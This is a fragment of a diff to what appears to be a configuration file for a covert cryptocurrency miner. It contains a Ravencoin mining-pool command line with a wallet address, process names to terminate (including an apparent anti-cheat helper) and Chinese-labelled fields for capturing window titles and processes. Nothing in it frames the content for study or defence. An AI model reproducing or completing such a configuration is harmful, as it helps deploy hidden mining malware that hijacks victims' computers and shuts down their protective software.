@@ -16,7 +16,7 @@ A6A-- -o stratum+tcp://rvn-pool.beepool.org:9531 -a x16r -u RNxtTYaFdtxHTAHXcXM9
 A9A--ON1--A9A
 A0A--\TP5Helper.exe--A0A
 A8A--TASLogin.exe--A8A---需要终止
-B1B-取取取取取取取取-B1B---取邮标题名
-B2B-取取取取取取取取取-B2B---取标题名
+B1B--sfdgefggfdgsdrgdfgcxvbdfg--B1B---取邮标题名
+B2B--sfdgefggfdgsdrgdfgcxvbdfg--B2B---取标题名
 B3B--取取取取取取取取取取--B3B---取邮进程
 B4B--取取取取取取取取取--B4B---取进程
